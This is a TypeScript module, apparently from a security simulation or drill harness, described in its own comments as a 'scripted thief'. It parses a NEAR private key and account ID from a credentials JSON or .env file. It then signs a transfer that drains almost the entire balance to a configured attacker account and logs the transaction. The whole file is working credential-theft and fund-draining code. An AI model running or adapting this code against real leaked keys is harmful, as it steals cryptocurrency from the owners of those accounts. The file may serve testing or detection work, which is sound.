import fs from "node:fs";
import {
  actions, loadNetworkConfig, makeAccount, makeProvider, parseNearAmountSafe, requireAccount, roleAccount,
} from "@standin/core";
import { SECRET_RE } from "./scan.ts";
import { out } from "./util.ts";

/** Pull {account_id, secret} out of a near-credentials JSON or an .env-style file. */
export function readStolenKey(file: string): { account_id: string; secret: string } {
  const txt = fs.readFileSync(file, "utf8");
  try {
    const j = JSON.parse(txt);
    if (j.private_key && j.account_id) return { account_id: j.account_id, secret: j.private_key };
  } catch { /* not JSON */ }
  const secret = txt.match(SECRET_RE)?.[0];
  const acct = txt.match(/NEAR_ACCOUNT_ID\s*=\s*["']?([\w.-]+)/)?.[1];
  if (!secret || !acct) throw new Error(`no key/account found in ${file}`);
  return { account_id: acct, secret };
}

/** Scripted thief: drains the account the stolen key belongs to into the attacker account. */
export async function attackDrain(keyFile: string, reserveNear = "0.1"): Promise<{ tx_hash: string; block_height: number; to: string; sent_at: number }> {
  const cfg = loadNetworkConfig();
  const attacker = requireAccount(cfg, "attacker");
  const stolen = readStolenKey(keyFile);
  const acct = makeAccount(cfg, stolen.account_id, stolen.secret);
  const prov = makeProvider(cfg);
  const bal = BigInt(((await prov.viewAccount({ accountId: stolen.account_id } as any)) as any).amount);
  const amount = bal - parseNearAmountSafe(reserveNear);
  if (amount <= 0n) throw new Error("nothing to drain");
  const sent_at = Date.now();
  const res: any = await acct.signAndSendTransaction({ receiverId: attacker, actions: [actions.transfer(amount)], waitUntil: "INCLUDED" });
  const tx_hash = String(res.transaction?.hash ?? res.transaction_outcome?.id);
  let block_height = 0;
  for (let i = 0; i < 40 && !block_height; i++) {
    try {
      const r: any = await prov.viewTransactionStatus({ txHash: tx_hash, accountId: stolen.account_id, waitUntil: "INCLUDED" } as any);
      const bh = r?.transaction_outcome?.block_hash;
      if (bh) block_height = ((await prov.viewBlock({ blockId: bh } as any)) as any).header.height;
    } catch { await new Promise((r) => setTimeout(r, 250)); }
  }
  out(`drained ${(Number(amount / 10n ** 21n) / 1000).toFixed(3)} NEAR from ${stolen.account_id} to ${attacker}`);
  out(`tx ${tx_hash} block ${block_height}`);
  return { tx_hash, block_height, to: attacker, sent_at };
}
void roleAccount;
